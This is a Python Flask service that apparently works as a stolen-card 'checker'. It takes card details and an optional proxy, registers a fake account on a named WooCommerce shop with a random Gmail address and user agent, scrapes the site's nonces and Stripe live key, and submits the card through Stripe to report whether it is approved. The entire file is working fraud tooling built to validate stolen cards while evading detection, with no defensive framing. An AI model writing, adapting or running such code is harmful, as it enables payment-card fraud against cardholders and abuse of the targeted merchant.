from flask import Flask, request, jsonify
import requests
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import uuid
import random
import re

app = Flask(__name__)

def extract_pk_key(text):
    patterns = [
        r'"key"\s*:\s*"(pk_live_[A-Za-z0-9]+)"',
        r'"publishableKey"\s*:\s*"(pk_live_[0-9a-zA-Z]{24,})"',
        r'"stripePublishableKey"\s*:\s*"(pk_live_[0-9a-zA-Z]+)"',
        r'"(?:key|pk|publishable_key|public_key)"\s*:\s*"(pk_live_[A-Za-z0-9_]+)"',
        r"'(pk_live_[A-Za-z0-9]+)'",
        r'(pk_live_[A-Za-z0-9]{24,})'
    ]
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(1)
    return None

def Tele(ccx, url, proxy=None):
    try:
        n, mm, yy, cvc = ccx.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
    except:
        return {"status": "error", "response": "Invalid CC format"}

    dom = url.replace("https://", "").replace("http://", "").split("/")[0]
    mail = f"cristniki{random.randint(10000, 99999)}@gmail.com"
    user_agent = UserAgent().random
    r = requests.Session()

    if proxy:
        r.proxies.update({
            'http': f"http://{proxy}",
            'https': f"http://{proxy}"
        })

    try:
        headers = {
            'authority': dom,
            'accept': '*/*',
            'user-agent': user_agent,
            'content-type': 'application/x-www-form-urlencoded',
            'referer': f'https://{dom}/my-account/'
        }

        reg_page = r.get(f'https://{dom}/my-account/', headers=headers)
        soup = BeautifulSoup(reg_page.text, "html.parser")
        nonce_input = soup.find("input", {"name": "woocommerce-register-nonce"})
        if not nonce_input:
            return {"status": "declined", "response": "Nonce not found"}
        nonce = nonce_input.get("value")

        data = {
            'email': mail,
            'woocommerce-register-nonce': nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        r.post(f'https://{dom}/my-account/', headers=headers, data=data)

        r.get(f'https://{dom}/my-account/payment-methods/', headers=headers)
        response = r.get(f'https://{dom}/my-account/add-payment-method/', headers=headers)

        nonce_patterns = [
            r'"createAndConfirmSetupIntentNonce":"(.*?)"',
            r'"createSetupIntentNonce":"(.*?)"',
        ]
        found_nonce = None
        for pattern in nonce_patterns:
            match = re.search(pattern, response.text)
            if match:
                found_nonce = match.group(1)
                break
        if not found_nonce:
            return {"status": "declined", "response": "AJAX Nonce not found"}

        pk_key = extract_pk_key(response.text)
        if not pk_key:
            return {"status": "declined", "response": "Stripe key not found"}

        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        csi = str(uuid.uuid4())

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'user-agent': user_agent,
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'content-type': 'application/x-www-form-urlencoded',
        }

        data = (
            f"billing_details[email]={mail}"
            f"&billing_details[address][country]=IN"
            f"&type=card"
            f"&card[number]={n}"
            f"&card[cvc]={cvc}"
            f"&card[exp_year]={yy}"
            f"&card[exp_month]={mm}"
            f"&client_attribution_metadata[client_session_id]={csi}"
            f"&guid={guid}&muid={muid}&sid={sid}"
            f"&key={pk_key}"
        )

        resp = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        try:
            pm_id = resp.json()['id']
        except:
            return {"status": "declined", "response": resp.text}

        data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': found_nonce,
        }

        headers['authority'] = dom
        result = r.post(f'https://{dom}?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers, data=data)
        raw = result.text

        # success keywords
        if any(x in raw.lower() for x in ["succeeded", "setup_intent", "approved"]):
            return {"status": "approved", "response": raw}
        else:
            return {"status": "declined", "response": raw}

    except Exception as e:
        return {"status": "error", "response": str(e)}

@app.route('/check', methods=['GET'])
def check_card():
    cc = request.args.get('cc')
    proxy = request.args.get('proxy', None)

    if not cc:
        return jsonify({"error": "Missing 'cc' parameter"}), 400

    result = Tele(ccx=cc, url="https://geckocrafts.co.uk", proxy=proxy)
    return jsonify(result)

if __name__ == '__main__':
    app.run()
